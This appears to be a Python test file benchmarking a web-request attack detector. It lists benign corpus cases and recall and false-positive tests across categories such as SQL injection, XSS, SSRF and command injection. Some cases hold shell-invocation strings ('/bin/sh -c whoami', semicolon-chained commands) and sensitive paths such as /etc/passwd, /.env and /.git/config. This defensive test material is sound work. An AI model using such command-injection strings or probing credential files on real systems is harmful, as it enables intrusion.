    BenignCase(
        "sensitive_file_prose_audit_report_git_config_mirror",
        "See the audit report about /.git/config for the deprecated mirror repo.",
    ),
    BenignCase(
        "sensitive_file_prose_deployment_notes_dotenv_copy",
        "Deployment notes: copy /var/www/.env to the new host before cutover.",
    ),
    BenignCase(
        "dir_traversal_prose_runbook_etc_passwd_review",
        "The runbook says to check /etc/passwd for stale local accounts.",
    ),
    BenignCase(
        "cms_probing_prose_qa_htpasswd_403_confirmation",
        "QA confirmed /.htpasswd returns 403 after the hardening fix shipped.",
    ),
    BenignCase(
        "cms_probing_prose_wiki_setup_config_removal_note",
        "Please remove the old /wp-admin/setup-config.php reference from the wiki.",
    ),
    BenignCase(
        "cms_probing_prose_customer_screenshot_install_php",
        "The customer's screenshot shows /wp-admin/install.php in their browser "
        "history.",
    ),
    BenignCase(
        "cms_probing_prose_support_macro_wp_login_reset",
        "Our support macro links to /wp-login.php for password reset instructions.",
    ),
    BenignCase(
        "cms_probing_prose_migration_guide_xmlrpc_deprecated",
        "The migration guide references /xmlrpc.php as a deprecated endpoint.",
    ),
    BenignCase(
        "cms_probing_prose_internal_docs_phpinfo_deletion_list",
        "Internal docs list /phpinfo.php among files scheduled for deletion.",
    ),
    BenignCase(
        "sensitive_file_prose_infra_backup_dotenv_rotation",
        "The infra team backed up /var/www/.env before rotating credentials.",
    ),
    BenignCase(
        "sensitive_file_prose_git_config_purge_confirmation",
        "Please confirm /.git/config was purged from the old snapshot.",
    ),
    BenignCase(
        "cms_probing_prose_vendor_setup_wizard_reference",
        "The vendor's setup wizard used to live at /wp-admin/setup-config.php.",
    ),
    BenignCase(
        "cms_probing_prose_style_guide_plugins_example_url",
        "Our style guide references /wp-admin/plugins.php as an example URL.",
    ),
    BenignCase(
        "dir_traversal_prose_ops_notes_etc_passwd_audit",
        "Ops notes: /etc/passwd was reviewed during the compliance audit.",
    ),
    BenignCase(
        "cms_probing_prose_training_video_wp_login_demo",
        "The training video walks through /wp-login.php on the demo instance.",
    ),
    BenignCase(
        "cms_probing_prose_decommissioned_server_install_php_archive",
        "Please archive /wp-admin/install.php from the decommissioned server.",
    ),
    BenignCase(
        "cms_probing_prose_knowledge_base_xmlrpc_explainer",
        "The knowledge base article explains what /xmlrpc.php used to do.",
    ),
    BenignCase(
        "cms_probing_prose_legacy_monitoring_phpinfo_sandbox",
        "Legacy monitoring still polls /phpinfo.php on the sandbox environment.",
    ),
    BenignCase(
        "cms_probing_prose_support_ticket_htpasswd_auth_setup",
        "Support ticket #4821 mentions /.htpasswd as part of the old auth setup.",
    ),
    BenignCase(
        "cms_probing_prose_release_notes_setup_config_removed",
        "The release notes say /wp-admin/setup-config.php was removed in 3.9.",
    ),
    BenignCase(
        "cms_probing_prose_customer_sitemap_install_php_question",
        "Customer asked why /wp-admin/install.php still shows up in their sitemap.",
    ),
    BenignCase(
        "sensitive_file_prose_onboarding_wiki_dotenv_example",
        "The wiki page for onboarding references /var/www/.env as an example path.",
    ),
    BenignCase(
        "dir_traversal_prose_postmortem_etc_passwd_glossary",
        "Our postmortem doc mentions /etc/passwd only as a glossary term.",
    ),
    BenignCase(
        "cms_probing_prose_vendor_docs_xmlrpc_sample_requests",
        "The vendor documentation still shows /xmlrpc.php in its sample requests.",
    ),
    BenignCase(
        "sensitive_file_prose_public_bucket_git_config_exclusion",
        "Please double check /.git/config was excluded from the public bucket.",
    ),
    BenignCase(
        "cms_probing_prose_design_review_wp_login_mockup",
        "The design review referenced /wp-login.php as a UI mockup source.",
    ),
    BenignCase(
        "cms_probing_prose_historical_changelog_phpinfo_retirement",
        "Historical changelog: /phpinfo.php was retired from the staging tier.",
    ),
    BenignCase(
        "cms_probing_prose_teardown_script_install_php_fixtures",
        "The teardown script deletes /wp-admin/install.php from test fixtures.",
    ),
    BenignCase(
        "cms_probing_prose_customer_faq_plugins_not_public",
        "Customer FAQ explains that /wp-admin/plugins.php is no longer public.",
    ),
    BenignCase(
        "sensitive_file_prose_compliance_checklist_dotenv_audit_trail",
        "The compliance checklist references /var/www/.env for the audit trail.",
    ),
    BenignCase(
        "cmd_injection_semicolon_prefixed_deploy_script_flag",
        "; ./deploy.sh -f",
    ),
    BenignCase(
        "cmd_injection_bare_run_script_flag",
        "scripts/run.sh -v",
    ),
    BenignCase(
        "cmd_injection_prose_lint_script_flag_reminder",
        "Run ./scripts/lint.sh -v before pushing.",
    ),
    BenignCase(
        "rest_path_k8s_default_namespace_bare",
        "/api/v1/namespaces/default",
    ),
    BenignCase(
        "cmd_injection_prose_semicolon_quoted_absolute_shell_ls",
        "First run setup; /bin/sh -c 'ls' to verify.",
        "production",
        _SH_DASH_C_URL_PATH_KNOWN_FP_REASON,
    ),
    BenignCase(
        "cmd_injection_prose_semicolon_quoted_absolute_shell_whoami",
        "ticket note: reproduced by running commands; /bin/sh -c whoami showed root",
        "production",
        _SH_DASH_C_URL_PATH_KNOWN_FP_REASON,
    ),
    BenignCase(
        "cmd_injection_prose_semicolon_quoted_env_prefixed_shell",
        "runbook step 3: restart the shell; /usr/bin/env bash -c "
        "'systemctl restart app'",
        "production",
        _SEMICOLON_QUOTED_SHELL_KNOWN_FP_REASON,
    ),
    BenignCase(
        "cmd_injection_prose_semicolon_quoted_absolute_shell_debug_flag",
        "changelog: fixed default login; /bin/sh -x debug.sh now traces correctly",
    ),
    BenignCase(
        "cmd_injection_prose_semicolon_bare_shell_control",
        "First run setup; sh -c 'ls' to verify.",
        "production",
        _SEMICOLON_BARE_SHELL_CONTROL_KNOWN_FP_REASON,
    ),
    BenignCase(
        "cmd_injection_value_absolute_shell_c_npm_start",
        "/bin/sh -c 'npm start'",
        "production",
        _WHOLE_VALUE_SHELL_INVOCATION_KNOWN_FP_REASON,
    ),
    BenignCase(
        "cmd_injection_value_absolute_bash_login_flag",
        "/bin/bash -l",
        "production",
        _WHOLE_VALUE_SHELL_INVOCATION_KNOWN_FP_REASON,
    ),
    BenignCase(
        "cmd_injection_value_env_prefixed_bash_c_echo",
        "/usr/bin/env bash -c 'echo hi'",
        "production",
        _WHOLE_VALUE_SHELL_INVOCATION_KNOWN_FP_REASON,
    ),
    BenignCase(
        "cmd_injection_value_bare_shell_control",
        "sh -c 'npm start'",
        "production",
        _WHOLE_VALUE_BARE_SHELL_CONTROL_KNOWN_FP_REASON,
    ),
    BenignCase(
        "cmd_injection_ci_yaml_env_prefixed_run_step",
        "steps:\n  - run: |\n      FOO=bar BAZ=qux bash -c 'echo hi'",
        "production",
        _ENV_VAR_PREFIXED_SHELL_DASH_C_CI_CONFIG_KNOWN_FP_REASON,
    ),
    BenignCase(
        "cmd_injection_crontab_env_prefixed_backup_line",
        "5 4 * * * root\nPATH=/usr/bin:/bin bash -c 'do_backup.sh'",
        "production",
        _ENV_VAR_PREFIXED_SHELL_DASH_C_CI_CONFIG_KNOWN_FP_REASON,
    ),
    BenignCase(
        "cmd_injection_makefile_env_prefixed_recipe",
        "target:\n\tFOO=1 BAR=2 bash -c 'do_thing'",
        "production",
        _ENV_VAR_PREFIXED_SHELL_DASH_C_CI_CONFIG_KNOWN_FP_REASON,
    ),
    BenignCase(
        "ldap_glob_paren_null_mention",
        "glob pattern: *)%00 in filenames",
    ),
    BenignCase(
        "cmd_injection_sql_update_set_equals_backtick",
        "UPDATE t SET a=`b` WHERE id=1",
    ),
    BenignCase(
        "cmd_injection_query_string_equals_ampersand_backtick",
        "sort=`created_at`&order=asc",
    ),
    BenignCase(
        "cmd_injection_query_string_ampersand_equals_backtick",
        "a=1&`b`=2",
    ),
    BenignCase(
        "cmd_injection_assignment_equals_backtick_value",
        "value=`cmd`",
    ),
    BenignCase(
        "cmd_injection_url_query_param_equals_backtick",
        "https://example.com/search?q=`test`",
    ),
    BenignCase(
        "cmd_injection_sql_select_from_no_space_backtick",
        "SELECT`id`FROM users",
    ),
    BenignCase(
        "cmd_injection_json_expr_equals_backtick",
        '{"expr": "x=`y`"}',
    ),
    BenignCase(
        "cmd_injection_cjk_chinese_backtick_curl_mention",
        "请使用`curl`命令下载文件",
    ),
    BenignCase(
        "cmd_injection_cjk_japanese_backtick_npm_mention",
        "実行するには`npm`を使ってください",
    ),
    BenignCase(
        "cmd_injection_cjk_korean_backtick_id_mention",
        "사용법은`id`명령을 참고하세요",
    ),
    BenignCase(
        "cmd_injection_glued_kebab_identifier_header_forward",
        "header`x-forwarded-for`value",
    ),
    BenignCase(
        "cmd_injection_glued_kebab_identifier_config_well_known",
        "config`well-known`here",
    ),
    BenignCase(
        "cmd_injection_glued_plausible_token_ref_user_list",
        "ref`user`list",
    ),
    BenignCase(
        "cmd_injection_jquery_selector_bare_id_call",
        "$(id).addClass('active');",
    ),
    BenignCase(
        "cmd_injection_jquery_selector_hash_id_call",
        "$('#submit-button').on('click', handleSubmit);",
    ),
    BenignCase(
        "cmd_injection_js_template_dotted_prop",
        "const label = `Welcome ${obj.prop}`;",
    ),
    BenignCase(
        "cmd_injection_js_template_bare_var_brace",
        "const path = `/users/${id}`;",
    ),
    BenignCase(
        "xss_prose_bare_on_word_assignment_no_tag",
        "changelog: onboarding=complete and onward=next for the release",
    ),
    BenignCase(
        "ssrf_email_userinfo_localhost_domain_no_scheme",
        "System alerts are emailed to root@localhost by the nightly cron job.",
    ),
    BenignCase("ssrf_userinfo_email_style_public_domain", "user@example.com"),
    BenignCase(
        "xss_href_quoted_onboarding_path_slash_sep",
        '<a href="/onboarding">Get started</a>',
    ),
    BenignCase(
        "xss_src_quoted_only_prefixed_path_slash_sep",
        '<img src="/only-in-stock.png" alt="badge">',
    ),
    BenignCase(
        "xss_href_quoted_once_prefixed_path_slash_sep",
        '<link rel="stylesheet" href="/once-cache.css">',
    ),
    BenignCase("template_benign_curly_user_name", "{{ user.name }}"),
    BenignCase("template_benign_curly_title", "{{ title }}"),
    BenignCase("template_benign_curly_count", "{{ count }}"),
    BenignCase("template_benign_hash_brand_color", "#{brandColor}"),
    BenignCase("template_benign_hash_user_name", "#{user.name}"),
    BenignCase(
        "template_fp_date_curly_brace",
        "{{ 2024-01-02 }}",
    ),
    BenignCase(
        "template_fp_date_hash_brace",
        "#{2024-12-31}",
    ),
    BenignCase(
        "template_fp_call_branch_format_x",
        "{{ format(x) }}",
    ),
    BenignCase(
        "template_fp_call_branch_round_filter",
        "{{ item.price | round(2) }}",
    ),
    BenignCase(
        "template_fp_call_branch_helper_format",
        "#{ helper.format(value) }",
        "production",
        _SSTI_HASH_BRACE_CALL_SYNTAX_KNOWN_FP_REASON,
    ),
    BenignCase(
        "template_fp_call_branch_map_arrow",
        "{{ cart.items.map(item => item.price) }}",
    ),
    BenignCase("ssrf_benign_single_at_token_userinfo", "https://token@api.example.com"),
    BenignCase("ssrf_benign_single_at_userpass", "http://user:pass@host.com"),
    BenignCase("ssrf_benign_email_param", "email=a@b.com"),
    BenignCase("sensitive_file_benign_leading_tilde_home", "~/home"),
    BenignCase("sensitive_file_benign_bare_tilde_user", "~user"),
    BenignCase(
        "sensitive_file_benign_midstring_tilde_report",
        "/files/report~draft.txt",
    ),
    BenignCase("sqli_benign_multi_value_semicolon_pair", "a=1;b=2"),
    BenignCase("sqli_benign_sort_order_semicolon_pair", "sort=name;order=asc"),
    BenignCase("sqli_benign_semicolon_select_no_from", "; select all options"),
    BenignCase("sqli_benign_semicolon_update_no_set", "note; update your profile"),
    BenignCase("sqli_benign_semicolon_execute_no_proc", "; execute the plan"),
    BenignCase("sqli_benign_exec_bareword_call_shape", "execute report()"),
    BenignCase("sqli_benign_exec_qualified_proc_name", "EXEC dbo.Proc()"),
    BenignCase(
        "sqli_header_sort_order_by_bare_digit",
        "order by 3",
        "production",
        _SQLI_ORDER_BY_BARE_DIGIT_KNOWN_FP_REASON,
    ),
    BenignCase(
        "sqli_url_path_products_order_by_bare_digit",
        "/products/order by 3",
        "production",
        _SQLI_ORDER_BY_BARE_DIGIT_KNOWN_FP_REASON,
    ),
    BenignCase(
        "sqli_query_param_sort_order_by_bare_digit",
        "?sort=order by 3",
        "production",
        _SQLI_ORDER_BY_BARE_DIGIT_KNOWN_FP_REASON,
    ),
    BenignCase(
        "sqli_header_config_timeout_glued_comment",
        "timeout/*ms*/30",
        "production",
        _SQLI_GLUED_COMMENT_ANNOTATION_KNOWN_FP_REASON,
    ),
    BenignCase(
        "sqli_header_cookie_pref_timeout_glued_comment",
        "pref=timeout/*ms*/30",
        "production",
        _SQLI_GLUED_COMMENT_ANNOTATION_KNOWN_FP_REASON,
    ),
    BenignCase(
        "sqli_header_note_execute_sp_cleanup_prose",
        "please execute sp_cleanup manually",
        "production",
        _SQLI_EXEC_PROSE_INSTRUCTION_KNOWN_FP_REASON,
    ),
    BenignCase(
        "sqli_waitfor_prose_please_wait_for_the_delay", "please wait for the delay"
    ),
    BenignCase("sqli_waitfor_header_retry_delay_no_quotes", "X-Retry: delay 0:0:5"),
    BenignCase(
        "sqli_where_equals_question_mark_placeholder",
        "SELECT id FROM users WHERE id = ?",
    ),
    BenignCase(
        "sqli_where_equals_named_colon_placeholder",
        "SELECT id FROM users WHERE id = :id",
    ),
    BenignCase(
        "sqli_where_equals_named_at_placeholder",
        "SELECT id FROM users WHERE id = @id",
    ),
    BenignCase(
        "sqli_where_equals_dbapi_percent_s_placeholder",
        "SELECT id FROM users WHERE id = %s",
    ),
    BenignCase(
        "sqli_where_equals_dbapi_named_percent_placeholder",
        "SELECT id FROM users WHERE id = %(id)s",
    ),
    BenignCase(
        "sqli_where_equals_dollar_numbered_placeholder",
        "SELECT id FROM users WHERE id = $1",
    ),
    BenignCase(
        "sqli_where_equals_mybatis_hash_brace_placeholder",
        "SELECT id FROM users WHERE id = #{id}",
    ),
    BenignCase(
        "sqli_boolean_two_columns_or",
        "SELECT id FROM sessions WHERE status = 1 OR verified = 2",
    ),
    BenignCase(
        "sqli_boolean_bare_columns_or",
        "SELECT id FROM sessions WHERE active OR admin",
    ),
    # LEDGER 4.04, D-17, D-19, D-59: ordinary routes. The first six moved from
    # MALICIOUS_CORPUS (indistinguishable from the benign paths of the same row and
    # nested, so not root probe shapes); /static/bundle.js.map is caught only by an
    # opt-in return_pattern status:404 behavior rule (global_behavior_rules is empty
    # by default).
    BenignCase("path_version_top_level", "/version"),
    BenignCase("path_management_top_level", "/management"),
    BenignCase("path_management_nested_under_app", "/app/management/health"),
    BenignCase("path_management_nested_under_api", "/api/management"),
    BenignCase("path_system_and_version_both_nested", "/v2/system/version"),
    BenignCase("path_credentials_nested_under_service", "/service/credentials"),
    BenignCase("path_nested_inicio_html", "/en/inicio.html"),
    BenignCase(
        "path_nested_sourcemap",
        "/static/bundle.js.map",
        known_false_positive_reason=_NESTED_SCRIPT_VALUE_KNOWN_FP_REASON,
    ),
    BenignCase(
        "path_nested_app_sourcemap",
        "/static/app.js.map",
        known_false_positive_reason=_NESTED_SCRIPT_VALUE_KNOWN_FP_REASON,
    ),
    BenignCase(
        "path_nested_source_extension_py",
        "/assets/main.py",
        known_false_positive_reason=_NESTED_SCRIPT_VALUE_KNOWN_FP_REASON,
    ),
    BenignCase(
        "path_nested_source_extension_sh",
        "/downloads/setup.sh",
        known_false_positive_reason=_NESTED_SCRIPT_VALUE_KNOWN_FP_REASON,
    ),
    BenignCase("path_nested_changelog", "/docs/changelog"),
    BenignCase("path_top_level_changelog_page", "/changelog"),
    BenignCase("path_nested_readme_md", "/docs/README.md"),
    BenignCase("path_language_route", "/language/en"),
    BenignCase("path_languages_route", "/languages"),
    BenignCase("path_system_status_route", "/system/status"),
    BenignCase(
        "path_nested_jsp_page",
        "/news/index.jsp",
        known_false_positive_reason=_NESTED_SCRIPT_VALUE_KNOWN_FP_REASON,
    ),
    BenignCase("path_wp_content_uploads_media", "/wp-content/uploads/2024/a.jpg"),
    # Named webshell rows are scoped: nested shell.php and cmd.php outside an
    # upload-like directory stay clean (hits count toward bans, D-17).
    BenignCase(
        "path_nested_shell_php_outside_uploads",
        "/tools/shell.php",
        known_false_positive_reason=_NESTED_SCRIPT_VALUE_KNOWN_FP_REASON,
    ),
    BenignCase(
        "path_nested_cmd_php_outside_uploads",
        "/api/cmd.php",
        known_false_positive_reason=_NESTED_SCRIPT_VALUE_KNOWN_FP_REASON,
    ),
    # LEDGER 4.04, D-62: same route shape as /system/status, a false positive here is a
    # ban strike; case-sensitive CHANGELOG rows leave the lowercase page route alone.
    BenignCase("path_system_log_directory", "/system/log/"),
    BenignCase("path_system_logs_directory", "/system/logs/"),
    BenignCase("path_changelog_title_case_page", "/Changelog"),
    BenignCase("path_nested_upper_changelog", "/docs/CHANGELOG"),
]

BASELINE_MALICIOUS_DETECTED_BY_CATEGORY: dict[str, int] = {
    "cmd_injection": 38,
    "cms_probing": 36,
    "code_injection": 3,
    "deserialization": 18,
    "dir_traversal": 10,
    "file_inclusion": 16,
    "file_upload": 32,
    "http_split": 4,
    "ldap": 25,
    "nosql": 10,
    "path_traversal": 13,
    "proto_pollution": 8,
    "recon": 23,
    "sensitive_file": 16,
    "sqli": 38,
    "ssrf": 32,
    "template": 13,
    "xml": 4,
    "xss": 39,
}
BASELINE_MALICIOUS_DETECTED_TOTAL_PRODUCTION = 378
BASELINE_MALICIOUS_DETECTED_TOTAL_LEGACY_SMOKE = 378

_NAMED_VALUE_KNOWN_FP_CASE_IDS = frozenset(
    {
        "path_version_top_level",
        "path_management_top_level",
        "path_management_nested_under_app",
        "path_management_nested_under_api",
        "path_system_and_version_both_nested",
        "path_credentials_nested_under_service",
        "path_nested_inicio_html",
        "path_nested_changelog",
        "path_top_level_changelog_page",
        "path_nested_readme_md",
        "path_language_route",
        "path_languages_route",
        "path_system_status_route",
        "path_wp_content_uploads_media",
        "path_system_log_directory",
        "path_system_logs_directory",
        "path_changelog_title_case_page",
        "path_nested_upper_changelog",
    }
)
_NAMED_VALUE_KNOWN_FP_REASON = (
    "D-74 and D-75: v4.4.0 flags this named route path. In a URL path the matched "
    "route template decides (clean when it declares the named segment); a value in "
    "a body or query carries no route, so it stays flagged exactly as in v4.4.0"
)
BENIGN_CORPUS = [
    case._replace(known_false_positive_reason=_NAMED_VALUE_KNOWN_FP_REASON)
    if case.case_id in _NAMED_VALUE_KNOWN_FP_CASE_IDS
    else case
    for case in BENIGN_CORPUS
]


BASELINE_BENIGN_FALSE_POSITIVE_BY_CATEGORY: dict[str, int] = {
    "cmd_injection": 10,
    "cms_probing": 1,
    "dir_traversal": 3,
    "file_inclusion": 3,
    "recon": 18,
    "sensitive_file": 6,
    "sqli": 6,
    "ssrf": 4,
    "template": 1,
}
BASELINE_BENIGN_FALSE_POSITIVE_TOTAL = 48

_WALL_TIME_CEILING_SECONDS = 40.0


async def _malicious_case_detected_categories(
    case: MaliciousCase, detectors: dict[str, SusPatternsManager]
) -> set[str]:
    detector = detectors[case.detector]
    result = await detector.detect(
        content=case.payload, ip_address="203.0.113.9", context="request_body"
    )
    if not result["is_threat"]:
        return set()
    return {str(threat.get("category")) for threat in result["threats"]}


async def _benign_case_flagged_categories(
    case: BenignCase, detectors: dict[str, SusPatternsManager]
) -> set[str]:
    detector = detectors[case.detector]
    result = await detector.detect(
        content=case.payload, ip_address="198.51.100.4", context="request_body"
    )
    if not result["is_threat"]:
        return set()
    return {str(threat.get("category")) for threat in result["threats"]}


def _fraction(numerator: int, denominator: int) -> str:
    percentage = 100.0 * numerator / denominator if denominator else 0.0
    return f"{numerator}/{denominator} ({percentage:.1f}%)"


def _build_report(
    malicious_detected_by_category: dict[str, int],
    malicious_total_by_category: dict[str, int],
    benign_flagged_by_category: dict[str, int],
    benign_total: int,
    malicious_detected_total: int,
    malicious_total: int,
    benign_flagged_total: int,
    wall_time_seconds: float,
) -> str:
    lines = [
        "DETECTION BENCHMARK REPORT",
        f"malicious corpus: {malicious_total} cases across "
        f"{len(malicious_total_by_category)} categories, "
        f"{sum(1 for c in MALICIOUS_CORPUS if c.known_gap_reason)} documented "
        "known gaps",
        f"benign corpus: {benign_total} cases, "
        f"{sum(1 for c in BENIGN_CORPUS if c.known_false_positive_reason)} "
        "documented known false positives",
        f"wall time: {wall_time_seconds:.3f}s",
        "",
        "per-category recall (detected/total):",
    ]
    for category in sorted(malicious_total_by_category):
        detected = malicious_detected_by_category.get(category, 0)
        total = malicious_total_by_category[category]
        lines.append(f"  {category:16} {_fraction(detected, total)}")
    lines.append("")
    lines.append("per-category false-positive attribution (benign hits/total benign):")
    for category in sorted(ALL_DETECTION_CATEGORIES):
        flagged = benign_flagged_by_category.get(category, 0)
        lines.append(f"  {category:16} {_fraction(flagged, benign_total)}")
    lines.append("")
    lines.append(
        f"total recall:    {_fraction(malicious_detected_total, malicious_total)}"
    )
    lines.append(f"total fp rate:   {_fraction(benign_flagged_total, benign_total)}")
    lines.append("")
    lines.append("known gaps (documented, still counted in the denominator):")
    for malicious_case in MALICIOUS_CORPUS:
        if malicious_case.known_gap_reason:
            lines.append(
                f"  {malicious_case.case_id} [{malicious_case.category}]: "
                f"{malicious_case.known_gap_reason}"
            )
    lines.append("")
    lines.append(
        "known false positives (documented, still counted in the denominator):"
    )
    for benign_case in BENIGN_CORPUS:
        if benign_case.known_false_positive_reason:
            lines.append(
                f"  {benign_case.case_id}: {benign_case.known_false_positive_reason}"
            )
    return "\n".join(lines)


@pytest.mark.redos_timing
@pytest.mark.asyncio
async def test_detection_benchmark_recall_and_false_positive_rate() -> None:
    assert len(MALICIOUS_CORPUS) >= 120
    assert len(BENIGN_CORPUS) >= 120
    assert len(MALICIOUS_CORPUS) == len(
        {malicious_case.case_id for malicious_case in MALICIOUS_CORPUS}
    )
    assert len(BENIGN_CORPUS) == len(
        {benign_case.case_id for benign_case in BENIGN_CORPUS}
    )
    assert {
        malicious_case.category for malicious_case in MALICIOUS_CORPUS
    } == ALL_DETECTION_CATEGORIES
    assert set(BASELINE_MALICIOUS_DETECTED_BY_CATEGORY) == ALL_DETECTION_CATEGORIES

    start = time.monotonic()

    malicious_detected_by_category: dict[str, int] = {}
    malicious_total_by_category: dict[str, int] = {}
    undetected_case_ids_by_category: dict[str, list[str]] = {}
    undocumented_undetected_case_ids: list[str] = []
    for malicious_case in MALICIOUS_CORPUS:
        malicious_total_by_category[malicious_case.category] = (
            malicious_total_by_category.get(malicious_case.category, 0) + 1
        )
        hit_categories = await _malicious_case_detected_categories(
            malicious_case, _DETECTORS
        )
        if malicious_case.category in hit_categories:
            malicious_detected_by_category[malicious_case.category] = (
                malicious_detected_by_category.get(malicious_case.category, 0) + 1
            )
        else:
            undetected_case_ids_by_category.setdefault(
                malicious_case.category, []
            ).append(malicious_case.case_id)
            if not malicious_case.known_gap_reason:
                undocumented_undetected_case_ids.append(malicious_case.case_id)

    benign_flagged_by_category: dict[str, int] = {}
    benign_flagged_total = 0
    unexpected_false_positive_case_ids: list[str] = []
    for benign_case in BENIGN_CORPUS:
        hit_categories = await _benign_case_flagged_categories(benign_case, _DETECTORS)
        if hit_categories:
            benign_flagged_total += 1
            if not benign_case.known_false_positive_reason:
                unexpected_false_positive_case_ids.append(benign_case.case_id)
            for category in hit_categories:
                benign_flagged_by_category[category] = (
                    benign_flagged_by_category.get(category, 0) + 1
                )

    wall_time_seconds = time.monotonic() - start

    malicious_detected_total = sum(malicious_detected_by_category.values())

    report = _build_report(
        malicious_detected_by_category,
        malicious_total_by_category,
        benign_flagged_by_category,
        len(BENIGN_CORPUS),
        malicious_detected_total,
        len(MALICIOUS_CORPUS),
        benign_flagged_total,
        wall_time_seconds,
    )
    print(report)

    assert not undocumented_undetected_case_ids, (
        "undetected malicious item(s) with no known_gap_reason: "
        f"{undocumented_undetected_case_ids}\n{report}"
    )

    assert not unexpected_false_positive_case_ids, (
        "benign item(s) fired with no known_false_positive_reason: "
        f"{unexpected_false_positive_case_ids}\n{report}"
    )

    for category, baseline_detected in BASELINE_MALICIOUS_DETECTED_BY_CATEGORY.items():
        actual_detected = malicious_detected_by_category.get(category, 0)
        assert actual_detected >= baseline_detected, (
            f"{category} recall regressed: baseline={baseline_detected} "
            f"actual={actual_detected} "
            f"newly_undetected={undetected_case_ids_by_category.get(category, [])}\n"
            f"{report}"
        )

    assert malicious_detected_total >= BASELINE_MALICIOUS_DETECTED_TOTAL_PRODUCTION, (
        f"overall recall regressed: "
        f"baseline={BASELINE_MALICIOUS_DETECTED_TOTAL_PRODUCTION} "
        f"actual={malicious_detected_total}\n{report}"
    )

    for category in sorted(ALL_DETECTION_CATEGORIES):
        baseline_fp = BASELINE_BENIGN_FALSE_POSITIVE_BY_CATEGORY.get(category, 0)
        actual_fp = benign_flagged_by_category.get(category, 0)
        assert actual_fp <= baseline_fp, (
            f"{category} false-positive attribution rose: baseline={baseline_fp} "
            f"actual={actual_fp}\n{report}"
        )

    assert benign_flagged_total <= BASELINE_BENIGN_FALSE_POSITIVE_TOTAL, (
        f"overall false-positive rate rose: "
        f"baseline={BASELINE_BENIGN_FALSE_POSITIVE_TOTAL} "
        f"actual={benign_flagged_total} "
        f"unexpected={unexpected_false_positive_case_ids}\n{report}"
    )

    assert wall_time_seconds < _WALL_TIME_CEILING_SECONDS * _cov_scale(), (
        f"detection benchmark wall time regressed: "
        f"ceiling={_WALL_TIME_CEILING_SECONDS}s actual={wall_time_seconds:.3f}s"
    )


_NON_BACKTICK_PERF_CORPUS: list[str] = [
    case.payload
    for case in list(MALICIOUS_CORPUS) + list(BENIGN_CORPUS)
    if "`" not in case.payload
]

_BACKTICK_PERF_CEILING_SECONDS = 40.0


@pytest.mark.redos_timing
@pytest.mark.asyncio
async def test_glued_backtick_discriminator_perf_on_non_backtick_content() -> None:
    assert len(_NON_BACKTICK_PERF_CORPUS) >= 100

    async def _scan_corpus_once() -> float:
        start = time.monotonic()
        for payload in _NON_BACKTICK_PERF_CORPUS:
            await _PRODUCTION_MANAGER.detect(
                content=payload, ip_address="203.0.113.9", context="request_body"
            )
        return time.monotonic() - start

    await _scan_corpus_once()
    durations = sorted([await _scan_corpus_once() for _ in range(5)])
    median_seconds = durations[len(durations) // 2]

    print(
        f"glued backtick discriminator perf on {len(_NON_BACKTICK_PERF_CORPUS)} "
        f"non-backtick payloads: median={median_seconds:.4f}s "
        f"runs={[f'{d:.4f}' for d in durations]}"
    )

    assert median_seconds < _BACKTICK_PERF_CEILING_SECONDS * _cov_scale(), (
        f"non-backtick detection pass got {median_seconds:.4f}s, "
        f"more than {_BACKTICK_PERF_CEILING_SECONDS}s for "
        f"{len(_NON_BACKTICK_PERF_CORPUS)} payloads"
    )


_KNOWN_LEGACY_SMOKE_UNDETECTED_CASE_IDS: dict[str, str] = {}


def _build_legacy_smoke_report(
    malicious_detected_total: int,
    benign_flagged_total: int,
) -> str:
    lines = [
        "LEGACY SMOKE REPORT",
        f"malicious corpus: {len(MALICIOUS_CORPUS)} cases, "
        f"{malicious_detected_total} detected under the legacy singleton",
        f"benign corpus: {len(BENIGN_CORPUS)} cases, "
        f"{benign_flagged_total} flagged under the legacy singleton",
        "",
        "undetected malicious item(s) with a known_gap_reason "
        "(pre-existing, applies to every detection mode, not legacy-only):",
    ]
    for malicious_case in MALICIOUS_CORPUS:
        if malicious_case.known_gap_reason:
            lines.append(
                f"  {malicious_case.case_id} [{malicious_case.category}]: "
                f"{malicious_case.known_gap_reason}"
            )
    lines.append("")
    lines.append(
        "legacy-only undetected malicious item(s) "
        "(_KNOWN_LEGACY_SMOKE_UNDETECTED_CASE_IDS):"
    )
    for case_id, reason in _KNOWN_LEGACY_SMOKE_UNDETECTED_CASE_IDS.items():
        lines.append(f"  {case_id}: {reason}")
    return "\n".join(lines)


@pytest.mark.asyncio
async def test_detection_benchmark_legacy_smoke() -> None:
    malicious_detected_total = 0
    undocumented_undetected_case_ids: list[str] = []
    for malicious_case in MALICIOUS_CORPUS:
        hit_categories = await _malicious_case_detected_categories(
            malicious_case, _LEGACY_SMOKE_DETECTORS
        )
        if malicious_case.category in hit_categories:
            malicious_detected_total += 1
        elif (
            not malicious_case.known_gap_reason
            and malicious_case.case_id not in _KNOWN_LEGACY_SMOKE_UNDETECTED_CASE_IDS
        ):
            undocumented_undetected_case_ids.append(malicious_case.case_id)

    benign_flagged_total = 0
    unexpected_false_positive_case_ids: list[str] = []
    for benign_case in BENIGN_CORPUS:
        hit_categories = await _benign_case_flagged_categories(
            benign_case, _LEGACY_SMOKE_DETECTORS
        )
        if hit_categories:
            benign_flagged_total += 1
            if not benign_case.known_false_positive_reason:
                unexpected_false_positive_case_ids.append(benign_case.case_id)

    report = _build_legacy_smoke_report(malicious_detected_total, benign_flagged_total)
    print(report)

    assert not undocumented_undetected_case_ids, (
        "legacy singleton: undetected malicious item(s) with no "
        f"known_gap_reason: {undocumented_undetected_case_ids}\n{report}"
    )
    assert not unexpected_false_positive_case_ids, (
        "legacy singleton: benign item(s) fired with no "
        f"known_false_positive_reason: {unexpected_false_positive_case_ids}\n{report}"
    )

    assert malicious_detected_total >= BASELINE_MALICIOUS_DETECTED_TOTAL_LEGACY_SMOKE, (
        f"legacy singleton recall regressed: "
        f"baseline={BASELINE_MALICIOUS_DETECTED_TOTAL_LEGACY_SMOKE} "
        f"actual={malicious_detected_total}\n{report}"
    )
    assert benign_flagged_total <= BASELINE_BENIGN_FALSE_POSITIVE_TOTAL, (
        f"legacy singleton false-positive rate rose: "
        f"baseline={BASELINE_BENIGN_FALSE_POSITIVE_TOTAL} "
        f"actual={benign_flagged_total}\n{report}"
    )


_AMBIGUOUS_DOLLAR_SUBSTITUTION_QUERY_URL_KNOWN_FP_REASON = (
    "a bare single-token $(...)/${...} substitution is deliberately "
    "context-gated to query_param/url_path so it stays detected there "
    "as a deliberate detection-with-disclosure choice: the jQuery "
    "$(id)/$('#x') selector, the "
    "${HOME} shell-doc var expansion, the Makefile $(CC)/$(CFLAGS) mention, "
